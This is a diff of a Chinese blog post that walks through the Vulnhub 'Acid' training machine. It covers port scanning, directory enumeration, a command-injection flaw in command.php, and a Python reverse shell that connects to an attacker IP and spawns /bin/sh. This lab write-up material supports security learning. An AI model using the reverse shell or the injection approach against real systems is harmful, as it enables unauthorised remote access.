@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="title: 靶机渗透训练之Aciddate: 2019-11-24 18:31:57 《Vulnhub靶场题解–红日安全团队》之Acid 信息收集1nmap -sX -A  192.168.154.145 -p0-65535  开放33447端口，且为web服务   dirbuster扫描目录，发现Challenge文件夹，内有敏感文件 1&#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlis">
+    <meta name="description" content="《Vulnhub靶场题解–红日安全团队》之Acid 信息收集1nmap -sX -A  192.168.154.145 -p0-65535  开放33447端口，且为web服务   dirbuster扫描目录，发现Challenge文件夹，内有敏感文件 1&#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt   在访问Challe">
 <meta property="og:type" content="article">
 <meta property="og:title" content="靶机渗透训练之Acid">
 <meta property="og:url" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid&#x2F;">
 <meta property="og:site_name" content="Rj45&#39;s blog">
-<meta property="og:description" content="title: 靶机渗透训练之Aciddate: 2019-11-24 18:31:57 《Vulnhub靶场题解–红日安全团队》之Acid 信息收集1nmap -sX -A  192.168.154.145 -p0-65535  开放33447端口，且为web服务   dirbuster扫描目录，发现Challenge文件夹，内有敏感文件 1&#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlis">
+<meta property="og:description" content="《Vulnhub靶场题解–红日安全团队》之Acid 信息收集1nmap -sX -A  192.168.154.145 -p0-65535  开放33447端口，且为web服务   dirbuster扫描目录，发现Challenge文件夹，内有敏感文件 1&#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt   在访问Challe">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid&#x2F;image-20191124183638929.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid&#x2F;image-20191124193924220.png">
@@ -29,7 +29,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid&#x2F;image-20191124202923768.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid&#x2F;image-20191124203044222.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid&#x2F;image-20191124203159279.png">
-<meta property="og:updated_time" content="2019-11-24T12:33:45.844Z">
+<meta property="og:updated_time" content="2019-11-24T12:43:03.301Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid&#x2F;image-20191124183638929.png">
     
@@ -150,7 +150,7 @@
       
     <div class="postdate">
       
-        <time datetime="2019-11-24T10:31:57.049Z" itemprop="datePublished">2019-11-24</time>
+        <time datetime="2019-11-24T12:36:51.000Z" itemprop="datePublished">2019-11-24</time>
         
       
     </div>
@@ -165,8 +165,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <p>title: 靶机渗透训练之Acid<br>date: 2019-11-24 18:31:57</p>
-<p>《Vulnhub靶场题解–红日安全团队》之Acid</p>
+    <p>《Vulnhub靶场题解–红日安全团队》之Acid</p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sX -A  192.168.154.145 -p0-65535</span><br></pre></td></tr></table></figure>
 
 <p>开放33447端口，且为web服务</p>
@@ -185,9 +184,9 @@
 
 <p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124193152283.png" alt="image-20191124193152283"></p>
 <p>在<code>http://192.168.154.145:33447/Challenge/Magic_Box/command.php</code>下发现命令注入漏洞。</p>
-<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>在<code>http://192.168.154.145:33447/Challenge/Magic_Box/command.php</code>下</p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>在<code>http://192.168.154.145:33447/Challenge/Magic_Box/command.php</code>中</p>
 <p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124193731482.png" alt="image-20191124193731482"></p>
-<p>构造命令注入payload</p>
+<p>构造payload</p>
 <p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124194155158.png" alt="image-20191124194155158"></p>
 <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>bash方式，nc方式都不成功，最后利用python反弹成功</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.154.131&quot;,6868))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure>
